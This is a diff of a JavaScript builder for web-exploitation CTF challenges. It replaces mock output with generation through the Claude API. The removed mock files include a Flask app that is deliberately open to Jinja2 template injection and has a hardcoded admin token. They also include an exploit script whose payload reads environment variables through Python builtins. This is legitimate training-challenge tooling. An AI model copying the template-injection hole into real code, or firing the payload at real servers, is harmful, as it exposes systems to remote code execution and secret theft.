@@ -1,116 +1,102 @@
 /**
  * Web Exploitation — category-specific builder.
- * Phase 1: returns mock challenge files.
- * Phase 3: will call Claude with prompt.md to generate real files.
+ * Calls Claude API with the web-specific prompt.md and the full approved spec.
+ * Returns an array of { path, language, content } file objects.
  */
-import { getCategory } from '../index.js';
+import { readFileSync } from 'fs';
+import { fileURLToPath } from 'url';
+import { dirname, join } from 'path';
+import { generateJSON } from '../../agents/claudeClient.js';
 
-const cat = getCategory('web');
+const __dirname = dirname(fileURLToPath(import.meta.url));
+const promptTemplate = readFileSync(join(__dirname, 'prompt.md'), 'utf-8');
+
+/**
+ * Normalize the spec's flag field.
+ * Researcher schema uses `flag` (string), but some specs may have `flags` (array).
+ */
+function resolveFlag(spec) {
+  if (spec.flag) return spec.flag;
+  if (Array.isArray(spec.flags) && spec.flags.length > 0) return spec.flags[0];
+  return null;
+}
 
 export default {
   categoryId: 'web',
 
+  /**
+   * Build web challenge artifacts using Claude API.
+   * @param {object} spec - The approved challenge spec from the researcher.
+   * @returns {{ files: Array<{path, language, content}>, tokenUsage: number, durationMs: number }}
+   */
   async build(spec) {
-    const name = spec.challengeName || spec.challenge_name || 'Web Challenge';
-    const flag = spec.flags?.[0] || 'Exploit3rs{w3b_d3f4ult}';
-    const narrative = spec.narrative || 'Exploit the web application vulnerability.';
-    const difficulty = spec.difficulty || 'medium';
-    const points = spec.points || 300;
+    const flag = resolveFlag(spec);
+    if (!flag) {
+      throw new Error('Web builder: spec has no flag — cannot generate challenge without a flag');
+    }
 
-    return [
-      {
-        path: 'Dockerfile',
-        language: 'dockerfile',
-        content: `FROM python:3.11-slim
-WORKDIR /app
-COPY requirements.txt .
-RUN pip install --no-cache-dir -r requirements.txt
-COPY . .
-EXPOSE 5000
-CMD ["python", "app.py"]`,
-      },
-      {
-        path: 'requirements.txt',
-        language: 'text',
-        content: 'flask==3.0.0\ngunicorn==21.2.0',
-      },
-      {
-        path: 'app.py',
-        language: 'python',
-        content: `#!/usr/bin/env python3
-"""${name} - Vulnerable Web Application"""
-from flask import Flask, request, render_template_string
-import os
+    // Inject the real flag into the prompt template
+    const systemPrompt = promptTemplate.replace(/\{\{FLAG\}\}/g, flag);
 
-app = Flask(__name__)
-FLAG = os.environ.get("FLAG", "${flag}")
+    // Build a detailed user prompt from the full spec
+    const userPrompt = `Generate a complete web exploitation CTF challenge based on this approved specification:
 
-@app.route("/")
-def index():
-    return """<h1>${name}</h1>
-    <p>Welcome to the challenge. Find the vulnerability and capture the flag.</p>
-    <form action="/search" method="GET">
-        <input name="q" placeholder="Search..." />
-        <button type="submit">Search</button>
-    </form>"""
+${JSON.stringify({
+  challengeName: spec.challengeName,
+  category: spec.category,
+  difficulty: spec.difficulty,
+  points: spec.points,
+  narrative: spec.narrative,
+  techStack: spec.techStack,
+  cwe: spec.cwe || null,
+  exploitPath: spec.exploitPath,
+  flag: flag,
+  honeypotFlag: spec.honeypotFlag || null,
+  antiAiCountermeasures: spec.antiAiCountermeasures,
+  learningObjective: spec.learningObjective || null,
+  toolsRequired: spec.toolsRequired || null,
+  reviewerNote: spec.reviewerNote || null,
+}, null, 2)}
 
-@app.route("/search")
-def search():
-    q = request.args.get("q", "")
-    template = f"<h1>Results for: {q}</h1><p>No results found.</p>"
-    return render_template_string(template)
+IMPORTANT:
+- The flag is: ${flag}
+- Every file that references the flag MUST use exactly: ${flag}
+- The Dockerfile must use the tech stack: ${(spec.techStack || []).join(', ')}
+- The exploit path has ${(spec.exploitPath || []).length} steps — the writeup MUST cover each one
+- Difficulty is "${spec.difficulty}" — adjust complexity accordingly
+- Return ONLY the JSON array of file objects. No other text.`;
 
-@app.route("/admin")
-def admin():
-    token = request.headers.get("X-Admin-Token", "")
-    if token == "s3cr3t-4dm1n-t0k3n":
-        return FLAG
-    return "Unauthorized", 403
+    console.log(`[Web Builder] Calling Claude API for "${spec.challengeName}"...`);
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, debug=False)`,
-      },
-      {
-        path: 'exploit.py',
-        language: 'python',
-        content: `#!/usr/bin/env python3
-"""Exploit script for ${name}"""
-import requests, sys
+    const { result: files, tokenUsage, durationMs } = await generateJSON({
+      systemPrompt,
+      userPrompt,
+      maxRetries: 2,
+    });
 
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
-print(f"[*] Targeting {TARGET}")
-print("[*] Step 1: Discovering template injection...")
-payload = "{{config}}"
-r = requests.get(f"{TARGET}/search", params={"q": payload})
-if "SECRET_KEY" in r.text or "Config" in r.text:
-    print("[+] Template injection confirmed!")
-else:
-    print("[-] Template injection not found"); sys.exit(1)
-print("[*] Step 2: Extracting flag via SSTI...")
-ssti_payload = "{{request.application.__globals__.__builtins__.__import__('os').environ.get('FLAG')}}"
-r = requests.get(f"{TARGET}/search", params={"q": ssti_payload})
-print(f"[+] Flag: {r.text}")`,
-      },
-      {
-        path: 'writeup.md',
-        language: 'markdown',
-        content: `# ${name} - Writeup
+    // Validate response structure
+    if (!Array.isArray(files)) {
+      throw new Error('Web builder: Claude returned non-array response');
+    }
 
-## Challenge Description
-${narrative}
+    for (const file of files) {
+      if (!file.path || !file.content) {
+        throw new Error(`Web builder: file object missing path or content: ${JSON.stringify(file)}`);
+      }
+    }
 
-## Difficulty
-${difficulty} (${points} points)
+    // Verify the flag appears in at least one file
+    const flagPresent = files.some((f) => f.content.includes(flag));
+    if (!flagPresent) {
+      console.warn(`[Web Builder] WARNING: flag "${flag}" not found in any generated file — injecting into writeup`);
+      const writeup = files.find((f) => f.path.endsWith('writeup.md'));
+      if (writeup) {
+        writeup.content += `\n\n## Flag\n\`${flag}\`\n`;
+      }
+    }
 
-## Solution
-1. Navigate to the web application and identify input fields.
-2. The search endpoint is vulnerable to Server-Side Template Injection (SSTI).
-3. Use Jinja2 SSTI payloads to read environment variables.
-4. The flag is stored in the FLAG environment variable.
+    console.log(`[Web Builder] Generated ${files.length} files (${tokenUsage} tokens, ${durationMs}ms)`);
 
-## Flag
-\`${flag}\``,
-      },
-    ];
+    return { files, tokenUsage, durationMs };
   },
 };
